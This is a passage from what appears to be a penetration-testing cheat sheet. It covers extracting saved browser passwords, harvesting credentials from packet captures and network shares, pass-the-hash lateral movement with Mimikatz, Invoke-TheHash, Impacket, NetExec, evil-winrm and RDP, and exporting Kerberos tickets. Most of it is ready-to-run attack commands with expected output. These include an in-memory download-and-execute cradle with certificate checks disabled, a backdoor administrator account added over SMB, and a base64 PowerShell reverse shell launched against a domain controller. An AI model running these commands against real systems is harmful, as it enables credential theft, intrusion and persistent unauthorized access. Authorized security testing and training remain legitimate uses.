[Firefox Decrypt](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. The script is [`here`](../scripts/passwords/firefox_decrypt.py).

**Download the tool**

```bash
git clone https://github.com/unode/firefox_decrypt
cd firefox_decrypt/
```

**Install python 3.9+**

```bash
wget https://www.python.org/ftp/python/3.9.18/Python-3.9.18.tar.xz
tar -xf Python-3.9.18.tar.xz
cd Python-3.9.18
./configure --enable-optimizations
make -j$(nproc)
sudo make altinstall
cd ..
rm -rf Python-3.9.18
rm Python-3.9.18.tar.xz
```

**Usage**

```bash
python3.9 ./firefox_decrypt.py
```

**Advanced usage**

```bash
python3.9 firefox_decrypt.py /folder/containing/profiles.ini/
```

</details>

</details>

<details>
<summary><h2>Chrome</h2></summary>

<details>
<summary><h3>decrypt-chrome-passwords</h3></summary>

[Decrypt Chrome Passwords](https://github.com/ohyicong/decrypt-chrome-passwords) is a simple program to decrypt chrome password saved on your machine.
This code has only been tested on windows, so it may not work on other OS.

**Install Prerequisites**

1. Install [Git](https://git-scm.com/downloads/win) for Windows

2. Install [Python](https://www.python.org/downloads/) for Windows

**Install**

```bash
git clone https://github.com/ohyicong/decrypt-chrome-passwords.git
cd decrypt-chrome-passwords
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

**Usage**

```bash
python3 python decrypt_chrome_password.py
```

</details>

</details>

</details>

---

<details>
<summary><h1>🌐 Extracting Passwords from the Network</h1></summary>

<details>
<summary><h2>Credential Hunting in Network Traffic</h2></summary>

Despite widespread TLS adoption, legacy systems and misconfigurations often expose sensitive data through unencrypted protocols. These vulnerabilities enable attackers to harvest credentials directly from network traffic.

| Unencrypted Protocol | Encrypted Counterpart         | Description                                                                 |
|----------------------|------------------------------|-----------------------------------------------------------------------------|
| HTTP                 | HTTPS                        | Used for transferring web pages and resources over the internet.            |
| FTP                  | FTPS/SFTP                    | Used for transferring files between a client and a server.                  |
| SNMP                 | SNMPv3 (with encryption)     | Used for monitoring and managing network devices like routers and switches.  |
| POP3                 | POP3S                        | Retrieves emails from a mail server to a local client.                      |
| IMAP                 | IMAPS                        | Accesses and manages email messages directly on the mail server.            |
| SMTP                 | SMTPS                        | Sends email messages from client to server or between mail servers.         |
| LDAP                 | LDAPS                        | Queries and modifies directory services like user credentials and roles.    |
| RDP                  | RDP (with TLS)               | Provides remote desktop access to Windows systems.                          |
| DNS (Traditional)    | DNS over HTTPS (DoH)         | Resolves domain names into IP addresses.                                    |
| SMB                  | SMB over TLS (SMB 3.0)       | Shares files, printers, and other resources over a network.                 |
| VNC                  | VNC with TLS/SSL             | Allows graphical remote control of another computer.                        |

<details>
<summary><h3>🦈 Wireshark</h3></summary>

Wireshark is a well-known packet analyzer that comes pre-installed on nearly all penetration testing Linux distributions. It features a powerful filtering engine, allowing efficient analysis of both live and captured network traffic. 

**Install**

```bash
sudo apt update
sudo apt install wireshark -y
wireshark --version
```

**Usage**

<details>
<summary><h4>1. Basic Commands</h4></summary>

Read PCAP file

```bash
tshark -r file.pcap
```

Live capture on eth0 interface

```bash
tshark -i eth0
```

Show only first 100 packets

```bash
tshark -r file.pcap -c 100
```

Quiet mode (statistics only)

```bash
tshark -r file.pcap -q
```

</details>

<details>
<summary><h4>2. Advanced Filtering</h4></summary>

Filter HTTP traffic

```bash
tshark -r file.pcap -Y "http"
```

Filter by source IP

```bash
tshark -r file.pcap -Y "ip.src == 192.168.1.1"
```

Search specific DNS queries

```bash
tshark -r file.pcap -Y "dns.qry.name contains 'google'"
```

Filter by TCP port

```bash
tshark -r file.pcap -Y "tcp.port == 445"
```

</details>

<details>
<summary><h4>3. Credential Extraction</h4></summary>

Extract HTTP POST form data

```bash
tshark -r file.pcap -Y "http.request.method == POST" -T json
```

Capture FTP credentials

```bash
tshark -r file.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"
```

Analyze SMB traffic

```bash
tshark -r file.pcap -Y "smb || nbns || dcerpc"
```

</details>

<details>
<summary><h4>4. Protocol Analysis</h4></summary>

Show TLS/SSL handshakes

```bash
tshark -r file.pcap -Y "tls.handshake"
```

Filter ICMP traffic (Ping)

```bash
tshark -r file.pcap -Y "icmp"
```

Analyze SSH connections

```bash
tshark -r file.pcap -Y "ssh.protocol"
```

</details>

<details>
<summary><h4>5. Data Export</h4></summary>

Export HTTP traffic to new PCAP

```bash
tshark -r file.pcap -Y "http" -w http_traffic.pcap
```

Extract files transferred via HTTP

```bash
tshark -r file.pcap --export-objects "http,export_dir"
```

Export specific fields to text

```bash
tshark -r file.pcap -T fields -e http.host -e http.request.uri
```

</details>

<details>
<summary><h4>6. Statistics</h4></summary>

Protocol hierarchy statistics

```bash
tshark -r file.pcap -qz io,phs
```

TCP conversations

```bash
tshark -r file.pcap -z conv,tcp
```

HTTP request summary

```bash
tshark -r file.pcap -z http_req,tree
```

</details>

<details>
<summary><h4>7. Pattern Searching</h4></summary>

Find credit card numbers

```bash
tshark -r file.pcap -Y "frame matches '[0-9]{13,16}'"
```

Search for passwords in cleartext

```bash
tshark -r file.pcap -Y "frame contains 'password'"
```

Find suspicious domains

```bash
tshark -r file.pcap -Y "dns.qry.name ~ '(malware|exploit)'"
```

</details>

<details>
<summary><h4>8. Advanced Decoding</h4></summary>

Decrypt TLS with keylog file

```bash
tshark -r file.pcap -o "tls.keylog_file:sslkeylog.log"
```

Analyze SMB2 commands in detail

```bash
tshark -r file.pcap -Y "smb2.cmd == 5" -V
```

</details>

<details>
<summary><h4>9. Pro Tips</h4></summary>

List all available fields

```bash
tshark -G fields | less
```

Real-time traffic analysis

```bash
tshark -i eth0 -Y "http" -l
```

Complex searches with grep

```bash
tshark -r file.pcap -V | grep -A 10 -B 10 "password"
```

</details>

Below are some basic yet useful filters to streamline your investigations:

| **Wireshark Filter**                              | **Description**                                                                                 |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `ip.addr == 56.48.210.13`                         | Filters packets with a specific IP address.                                                     |
| `tcp.port == 80`                                  | Filters packets by port (e.g., HTTP traffic).                                                   |
| `http`                                            | Filters for all HTTP traffic.                                                                   |
| `dns`                                             | Filters DNS traffic—useful for monitoring domain resolution.                                    |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | Filters SYN packets used in TCP handshakes, helpful for detecting scans or connection attempts. |
| `icmp`                                            | Filters ICMP packets (e.g., ping), useful for recon and troubleshooting.                        |
| `http.request.method == "POST"`                   | Filters HTTP POST requests; these may contain credentials if sent over unencrypted HTTP.        |
| `tcp.stream eq 53`                                | Filters a specific TCP stream, helpful for tracking conversations between hosts.                |
| `eth.addr == 00:11:22:33:44:55`                   | Filters packets to/from a specific MAC address.                                                 |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Filters traffic between two specific IPs, useful for focused host communication analysis.       |

One way to do this is by using a display filter such as http contains "passw". Alternatively, you can navigate to Edit > Find Packet and enter the desired search query manually. For example, you might search for packets containing the string "passw".

</details>

<details>
<summary><h3>🪪 Pcredz</h3></summary>

Pcredz is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:

* Credit card numbers
* POP credentials
* SMTP credentials
* IMAP credentials
* SNMP community strings
* FTP credentials
* Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
* NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
* Kerberos (AS-REQ Pre-Auth etype 23) hashes

**Install**

```bash
sudo apt install -y python3-pip libpcap-dev file && sudo pip3 install Cython python-libpcap
git clone https://github.com/lgandx/PCredz.git
cd PCredz
```

**Usage**

Extract credentials from a pcap file

```bash
python3 ./Pcredz -f file-to-parse.pcap
```

Extract credentials from all pcap files in a folder

```bash
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
```

Extract credentials from a live packet capture on a network interface (need root privileges)

```bash
python3 ./Pcredz -i eth0 -v
```

| Option               | Description                                                                 | Example Usage                          |
|----------------------|-----------------------------------------------------------------------------|----------------------------------------|
| `-h`, `--help`       | Shows a help message                                             | `pcredz -h`                            |
| `-f capture.pcap`    | Parse a specific pcap file                                                  | `pcredz -f traffic.pcap`               |
| `-d /path/to/pcaps/` | Recursively parse all pcap files in directory                               | `pcredz -d /home/pnt/pcap/`            |
| `-i eth0`            | Specify network interface for live capture                                  | `pcredz -i eth0`                       |
| `-v`                 | Enable verbose output (more detailed information)                           | `pcredz -f traffic.pcap -v`            |
| `-o output_dir`      | Store log files in custom directory instead of default Pcredz location      | `pcredz -f traffic.pcap -o /tmp/logs/` |

</details>

</details>

<details>
<summary><h2>Credential Hunting in Network Shares</h2></summary>

Network shares in corporate environments often contain sensitive data inadvertently left exposed. Effective credential hunting requires a methodical approach to identify and extract valuable authentication data.

**Common credential patterns**

As a quick reminder, here are some general tips:

* Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
* Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
* Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
* If you're trying to locate credentials within the `DOMAINNAME.LOCAL` domain, it may be helpful to search for files containing the string `DOMAINNAME\`.
* Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `Benutzer` than a `User`.
* Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a signifcant amount of time. Shares used by IT employees might be a more valuable target than those used for company photos.

<details>
<summary><h3>Hunting from Windows</h3></summary>

<details>
<summary><h4>Snaffler</h4></summary>

[Snaffler](https://github.com/SnaffCon/Snaffler) is a C# program that, when run on a domain-joined machine, automatically identifies accessible network shares and searches for interesting files. You can get the lateste executable for Windows [here](https://github.com/SnaffCon/Snaffler/releases).

**Usage**

```cmd
snaffler.exe -s -o snaffler.log
```
```cmd
snaffler.exe -s -i C:\ -o snaffler.log
```

Once you find a useful share, you can mount it to explore its files:

PowerShell:

```powershell
net use Z: \\<IP>\<SHARE_NAME> /user:<DOMAIN>\<USER> <PASSWORD> /persistent:no
```

| Option | Description | Example/Values |
|--------|-------------|----------------|
| `-o`   | Output results to a file | `-o C:\users\thing\snaffler.log` |
| `-s`   | Enable real-time stdout output | `-s` |
| `-v`   | Verbosity level | `Trace`, `Debug`, `Info` (default), `Data` |
| `-m`   | Output directory for copying found files | `-m C:\captured_files` |
| `-l`   | Max file size to copy (bytes) | Default: `10000000` (10MB) |
| `-i`   | Disable discovery; requires directory path | `-i \\server\share` |
| `-n`   | Disable computer discovery; specify hosts | `-n 192.168.1.100` or `-n hosts.txt` |
| `-y`   | TSV-formatted output | `-y` |
| `-b`   | Skip LAIM rules (0-3) | `-b 2` (medium filtering) |
| `-f`   | Find shares via DFS only | `-f` |
| `-a`   | List shares without file enumeration | `-a` |
| `-u`   | Pull interesting AD accounts for searches | `-u` |
| `-d`   | Target domain for computer discovery | `-d <DOMAIN>` |
| `-c`   | Domain controller for queries | `-c DC01.<DOMAIN>` |
| `-r`   | Max file size to search (bytes) | Default: `500000` (500KB) |
| `-j`   | Context bytes around found strings | `-j 200` (200 bytes) |
| `-z`   | Path to config file | `-z config.toml` or `-z generate` |
| `-t`   | Log output format | `plain` (default) or `json` |
| `-x`   | Max threads (minimum 4) | `-x 8` |
| `-p`   | Custom rules directory (.toml files) | `-p C:\custom_rules` |

> **NOTE:** The real power is in Snaffler's ability to chain multiple rules together, and even create branching chains. This allows us to use "cheap" rules like checking file names and extensions to decide when to use "expensive" rules like running regexen across the contents of files, parsing certs to see whether they contain private keys, etc.

**Rules**

Default Rules:

Snaffler comes with a set of default rules baked into the `.exe`. You can see them in `./Snaffler/SnaffRules/DefaultRules`.

Custom Rules:

*Option 1:* Edit or replace the rules in the `DefaultRules` directory, then build a fresh Snaffler. The `.toml` files in that dir will get baked into the `.exe` as resources, and loaded up at runtime whenever you don't specify any other rules to use.

*Option 2:* Make a directory and stick a bunch of your own rule files in there, then run Snaffler with `-p .\path\to\rules`. Snaffler will parse all the `.toml` files in that directory and use the resulting ruleset. This will also work if you just have them all in one big `.toml` file.

</details>

<details>
<summary><h4>PowerHuntShares</h4></summary>

Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an HTML report upon completion, providing an easy-to-use UI for reviewing the results.

The script can be found in the Github repo or [`here`](../scripts/passwords/PowerHuntShares.psm1).

**Setup Commands**

Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. *It is not persistent.*

*Option 1:* 

1. Bypass execution policy restrictions

```powershell
Set-ExecutionPolicy -Scope Process Bypass
```

2. Import module that exists in the current directory

```powershell
Import-Module .\PowerHuntShares.psm1
```

*Option 2:* 

1. Reduce SSL operating level to support connection to github

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[Net.ServicePointManager]::SecurityProtocol =[Net.SecurityProtocolType]::Tls12
```

2. Download and load PowerHuntShares.psm1 into memory

```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerHuntShares/main/PowerHuntShares.psm1")
```

**Usage**

> **NOTE:** All commands should be run as an unprivileged domain user.

Example #1: Run from a domain computer. Performs Active Directory computer discovery by default.

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

Example #2: Run from a domain computer with alternative domain credentials. Performs Active Directory computer discovery by default.

```powershell
$creds = Get-Credential <USER>
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public -Credential $creds
```

Example #3: Run from a domain computer as current user. Target hosts in a file. One per line.

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public  -HostList c:\temp\hosts.txt
```

Example #4: Run from a non-domain computer with credential. Performs Active Directory computer discovery by default.

Get a PowerShell session:

```cmd
runas /netonly /user:<DOMAIN>\<USER> PowerShell.exe
```

Setup the script:

```powershell
Set-ExecutionPolicy -Scope Process Bypass
Import-Module .\PowerHuntShares.psm1
```

Execute the tool:

```powershell
Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\Public -DomainController <DC IP> -Credential <DOMAIN>\<USER>
```

</details>

</details>

<details>
<summary><h3>Hunting from Linux</h3></summary>

<details>
<summary><h4>MANSPIDER</h4></summary>

If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run MANSPIDER using the official Docker container to avoid dependency issues.

**Install**

Pre-requisites:

```bash
sudo apt install tesseract-ocr && sudo apt install antiword
```

Tool:

```bash
pip install pipx
pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
```

**Install (using Docker)**

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Password2025!'
```

**Usage**

```bash
./manspider.sh --help
```

Example #1: Search the network for filenames that may contain creds
NOTE: matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)

```bash
manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> <KEY_WORD3> -d <corp> -u <USER> -p <PASSWORD>
```

Example #2: Search for spreadsheets with a key word in the filename
```bash
manspider <SHARE_NAME>.<corp.local> -f <KEY_WORD> -e <EXT 1> <EXT 2> -d <corp> -u <USER> -p <PASSWORD>
```

Example #3: Search for documents containing a key word
```bash
manspider <SHARE_NAME>.<corp.local> -c <KEY_WORD> -e <EXT 1> <EXT 2> <EXT 3> -d <corp> -u <USER> -p <PASSWORD>
```

Example #4: Search for interesting file extensions
```bash
manspider <SHARE_NAME>.<corp.local> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d <corp> -u <USER> -p <PASSWORD>
```

Example #5: Search for finance-related files
This example searches financy-sounding directories for filenames containing 5 or more consecutive numbers (e.g. `000202006.EFT`)
```bash
manspider <SHARE_NAME>.<corp.local> --dirnames bank financ payable payment reconcil remit voucher vendor eft swift -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>
```

Example #6: Search for SSH keys by filename
```bash
manspider <SHARE_NAME>.<corp.local> -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -d <corp> -u <USER> -p <PASSWORD>
```

Example #7: Search for SSH keys by content
```bash
manspider <SHARE_NAME>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>
```

Example #8: Search for password manager files

| Extension       | Password Manager                          |
|-----------------|------------------------------------------|
| `.kdbx`       | KeePass, KeePassXC                       |
| `.kdb`       | KeePass Classic                          |
| `.1pif`       | 1Password                                |
| `.agilekeychain` | 1Password                              |
| `.opvault`    | 1Password                                |
| `.lpd`        | LastPass                                 |
| `.dashlane`   | Dashlane                                 |
| `.psafe3`     | Password Safe                            |
| `.enpass`     | Enpass                                   |
| `.bwdb`       | Bitwarden                                |
| `.msecure`    | mSecure                                  |
| `.stickypass` | Sticky Password                          |
| `.pwm`       | Password Memory                          |
| `.rdb`        | RoboForm                                 |
| `.safe`      | SafeInCloud                              |
| `.zps`       | Zoho Vault                               |
| `.pmvault`    | SplashID Safe                            |
| `.mywallet`   | MyWallet                                 |
| `.jpass`      | JPass                                    |
| `.pwmdb`     | Universal Password Manager               |

```bash
manspider <SHARE_NAME>.<corp.local> -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -d <corp> -u <USER> -p <PASSWORD>
```

Example #9: Search for certificates
```bash
manspider <SHARE_NAME>.<corp.local> -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der -d <corp> -u <USER> -p <PASSWORD>
```

</details>

<details>
<summary><h4>NetExec</h4></summary>

In addition to its many other uses, NetExec can also be used to search through network shares using the --spider option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). 

A basic scan of network shares for files containing the string "passw" can be run like so:

```bash
netexec smb <IP> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "passw" --timeout 30
```

</details>

</details>

</details>

</details>

---

<details>
<summary><h1>↔️ Windows Lateral Movement Techniques</h1></summary>

<details>
<summary><h2>Pass the Hash (PtH)</h2></summary>

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (`ntds.dit`) on a Domain Controller.
* Pulling the hashes from memory (`lsass.exe`).

<details>
<summary><h3>Introduction to Windows NTLM Authentication</h3></summary>

NTLM (New Technology LAN Manager) is a legacy security protocol used by Microsoft Windows for authentication. It employs a challenge-response mechanism to verify user identities without transmitting plaintext passwords, providing single sign-on (SSO) capabilities.

**Key Characteristics**

* Still in Use: Maintained for backward compatibility with legacy systems.

* Replaced by Kerberos: Windows 2000+ domains default to Kerberos, but NTLM persists in many environments.

**Why NTLM Remains Relevant**

* Legacy system dependencies

* Fallback mechanism when Kerberos fails

* Still enabled in many Active Directory environments

</details>

<details>
<summary><h3>Pass the Hash with Mimikatz (Windows)</h3></summary>

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.

* **USER** - The user name we want to impersonate.
* **HASH_TYPE** - NTLM or rc4.
* **HASH** - NTLM or rc4 hash of the user's password.
* **DOMAIN** - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Get the hashes**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Run a CMD as th desired user**

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<corp.rth> /run:cmd.exe" exit
```

</details>

<details>
<summary><h3>Pass the Hash with PowerShell Invoke-TheHash (Windows)</h3></summary>

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

* **Target** - Hostname or IP address of the target.
* **Username** - Username to use for authentication.
* **Domain** - Domain to use for authentication. *This parameter is unnecessary with local accounts or when using the @domain after the username.*
* Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
* **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

<details>
<summary><h4>Invoke-TheHash with SMB</h4></summary>

**Import the module**

```powershell
Import-Module .\Invoke-TheHash.psd1
```

**Create a new user and add it to the Adminitrators group**

```powershell
Invoke-SMBExec -Target <IP> -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
```

**Expected output**

```powershell
VERBOSE: [+] <corp.rth>\<USER> successfully authenticated on <IP>
VERBOSE: <corp.rth>\<USER> has Service Control Manager write privilege on <IP>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on <IP>
VERBOSE: [*] Trying to execute command on <IP>
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on <IP>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on <IP>
```

We can also get a reverse shell connection in the target machine.

</details>

<details>
<summary><h4>Netcat listener</h4></summary>

**Start Netcat**

```cmd
.\nc.exe -lvnp <PORT>
```

**Generate the payload**

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option *PowerShell #3 (Base64)*.

To perform Pass-the-Hash (PtH) execution of a PowerShell reverse shell on the target DC01, use the following syntax with Invoke-TheHash:

**Import the module**

```powershell
Import-Module .\Invoke-TheHash.psd1
```

**Excute the reverse shell**

```powershell
Invoke-WMIExec -Target DC01 -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
```

The result is a reverse shell connection from the DC01 host.

</details>

</details>

<details>
<summary><h3>Pass the Hash with Impacket (Linux)</h3></summary>

We'll use Impacket's `psexec.py` to execute commands on the target system.

```bash
impacket-psexec Administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Impacket’s PsExec uploads a small helper (RemComSvc) to a writable admin share (e.g., ADMIN$ or C$), then creates and runs a Windows service using Service Control Manager. This requires both an admin account and write permission to the share.

> **NOTE:** If the share isn't writable or you aren’t an administrator, the attack will fail (you’ll see errors like “share 'ADMIN$' is not writable”)

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

</details>

<details>
<summary><h3>Pass the Hash with NetExec (Linux)</h3></summary>

NetExec is a powerful post-exploitation tool designed to automate security testing across large Active Directory environments. Its capabilities include:

* **Credential Validation**: Tests authentication across network hosts to identify systems where provided credentials grant local admin access
* **Password Spraying**: Attempts single login attempts across multiple hosts using provided credentials
* **Lockout Avoidance**: Supports local account testing to minimize domain account lockout risks

> **NOTE:** Always verify the target domain's account lockout policy before conducting password spraying tests.

**Start netexec**

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
```

**Expcted output**

```bash
# SMB         <DOMAIN_IP_1>   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
# SMB         <DOMAIN_IP_1>   445    DC01             [-] .\Administrator:<HASH> STATUS_LOGON_FAILURE 
# SMB         <DOMAIN_IP_2>   445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
# SMB         <DOMAIN_IP_2>   445    MS01             [+] .\Administrator <HASH> (Pwn3d!)
```

<details>
<summary><h4>Command Execution</h4></summary>

We can use the option -x to execute commands.

```bash
netexec smb <IP> -u Administrator -d . -H <HASH> -x whoami
```

**Expcted output**

```bash
# SMB         <IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
# SMB         <IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
# SMB         <IP>  445    MS01            [+] Executed command 
# SMB         <IP>  445    MS01            MS01\administrator
```

</details>

</details>

<details>
<summary><h3>Pass the Hash with evil-winrm (Linux)</h3></summary>

Evil-WinRM provides an alternative to SMB for Pass-the-Hash (PtH) attacks when:

* SMB ports are blocked, filtered, or shares aren’t writable
* You don’t have admin rights over SMB
* PowerShell Remoting (WinRM) is enabled (TCP 5985/5986)

Evil‑WinRM leverages WinRM (PowerShell Remoting) over HTTP(S) and doesn’t require SMB writable shares or service creation.

As long as the account belongs to Remote Management Users or equivalent, you can authenticate using an NTLM hash and spawn a remote PowerShell session.

```bash
evil-winrm -i <IP> -u <USER> -H <HASH>
```

**Expcted output**

```bash
# Evil-WinRM shell v3.3

# Info: Establishing connection to remote endpoint

# *Evil-WinRM* PS C:\Users\Administrator\Documents>
```

</details>

<details>
<summary><h3>Pass the Hash with RDP (Linux)</h3></summary>

We can perform an RDP PtH attack to gain GUI access to the target system using tools like *xfreerdp*.

The target host must have Restricted Admin Mode enabled. If disabled (default configuration), the attack will fail with the error:

> Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced.

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`. It can be done using the following command:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use *xfreerdp* with the option /pth to gain RDP access:

```bash
xfreerdp  /v:<IP> /u:'<USER>' /pth:<HASH>
```

</details>

<details>
<summary><h3>UAC limits Pass the Hash for local accounts</h3></summary>

User Account Control (UAC) imposes limitations on remote administration capabilities for local user accounts. This behavior is controlled by the following registry key:

Registry Key:
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`

Configuration Options:

| Value | Effect |
|-------|--------|
| 0 (Default) | Only the built-in local Administrator account (RID-500) can perform remote administration tasks |
| 1 | All local administrator accounts can perform remote administration |

> **Note:** There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

</details>

</details>

<details>
<summary><h2>Pass the Ticket (PtT)</h2></summary>

<details>
<summary><h3>PtT from Windows</h3></summary>

<details>
<summary><h4>Kerberos Protocol Refresher</h4></summary>

Kerberos is a ticket-based authentication system designed to avoid sharing user passwords with every service. Instead of sending passwords, the system stores authentication tickets locally and provides each service only with the specific ticket it requires. This design ensures that tickets cannot be reused for other purposes.

* The **Ticket Granting Ticket (TGT)** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or **TGS**.
* The **Ticket Granting Service (TGS)** is requested by users who want to use a service. These tickets allow services to verify the user's identity.

To obtain a **TGT**, the user authenticates to the domain controller by encrypting the current timestamp using their password hash. Since the domain controller knows the user's password hash, it can decrypt the timestamp to verify the user’s identity. Upon successful validation, the domain controller issues a **TGT**. From this point onward, the user does not need to use their password again during the session.

When the user wants to access a specific service—such as an MSSQL database—they request a **TGS** from the **Key Distribution Center (KDC)** using their **TGT**. The **TGS** is then presented to the MSSQL server to authenticate the user and authorize the connection.

</details>

<details>
<summary><h4>Pass the Ticket (PtT) attack</h4></summary>

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT) attack. It can be:

* Service Ticket (TGS) to allow access to a particular resource.
* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

Before we perform a **Pass the Ticket (PtT)** attack, let's see some methods to get a ticket using **Mimikatz** and **Rubeus**.

</details>

<details>
<summary><h4>Scenario</h4></summary>

During a penetration test, assume we successfully phished a user and gained access to their workstation. After escalating privileges, we now hold local administrator rights on the compromised machine.

With this level of access, we can interact with the Kerberos authentication mechanism in several ways—either by extracting existing tickets or generating new ones to escalate privileges, impersonate users, or move laterally across the domain.

Below, we explore the most common techniques for obtaining and forging Kerberos tickets.

</details>

<details>
<summary><h4>Harvesting Kerberos tickets from Windows</h4></summary>

Windows processes Kerberos tickets via the LSASS (Local Security Authority Subsystem Service) process. To extract any tickets, you need to interface directly with LSASS. As a standard user, you can only retrieve Kerberos tickets associated with your own session. However, once you've elevated to local administrator, you have full access to all tickets stored in LSASS memory — including other users' TGTs and TGS tickets.

> **Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

<details>
<summary><h5>Mimikatz - Export tickets</h5></summary>

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Export tickets**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit
```

**Verify the new file**

```cmd
dir *.kirbi
```

